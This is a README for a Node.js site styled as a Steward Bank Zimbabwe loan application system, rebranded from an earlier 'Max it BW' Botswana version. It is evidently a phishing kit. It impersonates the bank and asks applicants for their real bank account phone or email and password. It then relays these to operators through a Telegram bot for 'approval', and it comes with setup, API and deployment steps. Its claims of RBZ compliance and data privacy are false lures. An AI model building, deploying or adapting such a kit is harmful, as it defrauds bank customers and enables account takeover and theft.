# Steward Bank - Loan Application System 🏦

Professional loan application system for Steward Bank Zimbabwe with secure account verification.

## 🎨 Key Features

### ✨ Steward Bank Branding
- **Red & Maroon Color Scheme** (#C41E3A primary color)
- **Professional Design** matching Steward Bank's corporate identity
- **Zimbabwe Market** adapted for local needs
- **USD Currency** throughout the entire system

### 🔐 Security Features
- **Account Verification** - Phone/Email + Password (NO OTP required)
- **Bank-Level Encryption** - 256-bit SSL
- **RBZ Regulated** - Compliant with Reserve Bank of Zimbabwe
- **Secure Data Handling** - Privacy-first approach

### 💰 Loan Features
- **Amount Range**: $100 to $10,000 USD
- **Interest Rate**: 12% APR
- **Loan Terms**: 3, 6, 12, 24, or 36 months
- **Instant Calculator** - Real-time loan calculations
- **Fast Approval** - Decision in 15 minutes

## 📋 Major Changes from Original

### 🔄 Rebranding Changes
| Feature | Before (Max it BW) | After (Steward Bank) |
|---------|-------------------|----------------------|
| **Brand** | Max it BW | Steward Bank |
| **Country** | Botswana 🇧🇼 | Zimbabwe 🇿🇼 |
| **Currency** | P (Pula) | $ (USD) |
| **Colors** | Orange & Blue | Red & Maroon |
| **Phone Code** | +267 | +263 |
| **Regulator** | Botswana | RBZ (Reserve Bank of Zimbabwe) |

### 🚨 CRITICAL System Changes

#### ❌ REMOVED: OTP Verification System
- **Before**: 30-second link verification with 5-digit code
- **After**: COMPLETELY REMOVED - No OTP step at all

#### ✅ NEW: Account Verification System
- **Login Method**: Phone Number OR Email + Password/PIN
- **Credentials**: 
  - Phone: Any valid phone number (e.g., 0771234567)
  - Email: Any valid email address
  - Password/PIN: **ANY CHARACTERS** (not limited to digits)
- **Example**: 
  - Identifier: `tendai@example.com` or `0771234567`
  - Password: `MyP@ssw0rd123` or `SecurePin456`

### 📱 Application Flow

```
1. Landing Page (index.html)
   ↓
2. Application Form (application.html)
   ↓
3. Account Verification (verification.html) 
   ← Phone/Email + Password ←  NO OTP!
   ↓
4. Approval Page (approval.html)
```

### 🏙️ Zimbabwe Localization
- **Cities**: Harare, Bulawayo, Mutare
- **Names**: Tendai, Rumbidzai, Tafadzwa (in testimonials)
- **Phone Format**: +263 XX XXX XXXX
- **Currency**: All amounts in USD ($)
- **Timezone**: Africa/Harare

## 🚀 Quick Setup (5 Minutes)

### 1. Install Dependencies
```bash
npm install
```

### 2. Create .env File
```env
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/stewardbank
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
SUPER_ADMIN_CHAT_ID=YOUR_TELEGRAM_CHAT_ID
PORT=3000
```

### 3. Configure Admin (Edit database.js)
```javascript
const admins = [
    {
        id: 'admin_zw_001',
        name: 'Your Name',
        email: 'your.email@stewardbank.co.zw',
        telegramChatId: 'YOUR_CHAT_ID',
        status: 'active'
    }
];
```

### 4. Get Telegram Chat ID
```bash
node get-chat-id.js
# Send message to your bot
# Copy the chat ID that appears
```

### 5. Start Application
```bash
npm start
# Visit http://localhost:3000
```

## 🧪 Testing the Complete Flow

### Customer Journey:
1. **Landing Page** → Calculate loan with USD currency
2. **Application** → Fill form (loan: $100-$10,000)
3. **Verification** → Enter phone/email + password
   - NO OTP verification step
   - Direct account login
4. **Approval** → See approved loan details

### Admin Journey (Telegram):
1. Receive new application notification
2. Review account verification request
3. Approve or reject credentials
4. Customer sees result immediately

## 🎨 Steward Bank Design System

### Color Palette
```css
Primary Red:   #C41E3A  ████████
Dark Red:      #8B0000  ████████
Light Red:     #D32F2F  ████████
Gold Accent:   #FFD700  ████████
White:         #FFFFFF  ████████
```

### Typography
- **Font**: Inter (Professional & Modern)
- **Headers**: Bold 800 weight
- **Body**: Regular 400 weight

## 📂 File Structure

```
steward-bank-loan/
├── index.html                 - Landing page
├── application.html          - Loan application form
├── verification.html         - Account verification (NEW!)
├── approval.html            - Approval page
├── style.css                - Steward Bank theme
├── landing-script.js        - Calculator (USD)
├── application-script.js    - Form handling
├── verification-script.js   - Account login (NEW!)
├── approval-script.js       - Approval logic (USD)
├── server.js                - Express backend
├── database.js              - Data management
├── package.json             - Dependencies
└── README.md                - This file
```

## 🔐 Account Verification Details

### How It Works

1. **Customer Enters Credentials**
   ```
   Phone/Email: 0771234567 or email@example.com
   Password:    Any characters (e.g., MyPass123!)
   ```

2. **System Validates Format**
   - Checks if phone number or email
   - No password complexity requirements
   - Any characters accepted

3. **Admin Reviews**
   - Receives Telegram notification
   - Sees masked credentials
   - Approves or rejects

4. **Result**
   - Approved → Customer proceeds to loan approval
   - Rejected → Customer can retry

### API Endpoints

```javascript
// Account verification
POST /api/verify-account
{
  applicationId: "LOAN-xxx",
  identifier: "0771234567",
  password: "MyPass123",
  identifierType: "phone" // or "email"
}

// Check status
GET /api/check-verification-status/:applicationId
```

## 💵 Currency & Calculations

All amounts are in **USD ($)**:

| Loan Amount | Term | Monthly Payment | Total |
|-------------|------|-----------------|-------|
| $1,000      | 12mo | ~$92            | ~$1,104 |
| $5,000      | 12mo | ~$460           | ~$5,520 |
| $10,000     | 12mo | ~$920           | ~$11,040 |

**Interest Rate**: 12% APR (0.12)
**Formula**: Standard loan amortization

## 🌐 Deployment Options

### Option 1: Render.com (Recommended - Free)
```bash
1. Connect GitHub repository
2. Add environment variables
3. Deploy automatically
```

### Option 2: Heroku
```bash
heroku create steward-bank-loan
git push heroku main
heroku config:set MONGODB_URI=xxx
heroku config:set TELEGRAM_BOT_TOKEN=xxx
```

### Option 3: Own Server
```bash
# Install Node.js, MongoDB
# Clone repository
# Configure .env
# Run with PM2 or systemd
```

## ❓ FAQ

### Q: Why was OTP removed?
**A**: Steward Bank uses existing account verification instead of temporary codes. Customers login with their bank account credentials.

### Q: What password format is accepted?
**A**: ANY characters - letters, numbers, symbols. No restrictions. Examples: `Pass123`, `MyP@ssw0rd!`, `SecurePin789`

### Q: Can I use both phone and email?
**A**: Customer chooses one - either phone number OR email address, plus their password.

### Q: Is the old PIN system still there?
**A**: No. The 4-digit PIN was replaced with flexible password/PIN that accepts any characters.

### Q: Where is the OTP code entry?
**A**: Completely removed. There is no OTP step in the new flow.

## 📞 Support

- **Email**: support@stewardbank.co.zw
- **Phone**: +263 242 252459
- **Location**: Harare, Zimbabwe

## 🔒 Security

- ✅ 256-bit SSL encryption
- ✅ Secure password handling
- ✅ RBZ compliant
- ✅ Data privacy guaranteed
- ✅ No data sharing

## 📊 Summary of Changes

### ✅ Completed Changes
1. ✓ Rebranded from Max it BW to Steward Bank
2. ✓ Changed currency from P (Pula) to $ (USD)
3. ✓ Updated colors to red/maroon theme
4. ✓ Removed entire OTP verification system
5. ✓ Implemented phone/email + password verification
6. ✓ Updated all documentation
7. ✓ Changed market from Botswana to Zimbabwe
8. ✓ Updated contact information and branding

### 🎯 Key Features Maintained
1. ✓ Telegram admin notifications
2. ✓ Multi-admin support
3. ✓ Database functionality
4. ✓ Loan calculator
5. ✓ Application workflow
6. ✓ Approval system
7. ✓ Security features

---

**Made for Steward Bank Zimbabwe** 🇿🇼  
**Version**: 1.0.0 (Steward Bank Edition)  
**Last Updated**: February 2026  
**Currency**: USD ($)  
**Verification**: Phone/Email + Password (No OTP)
#   S t e w a r d - b a n k  
 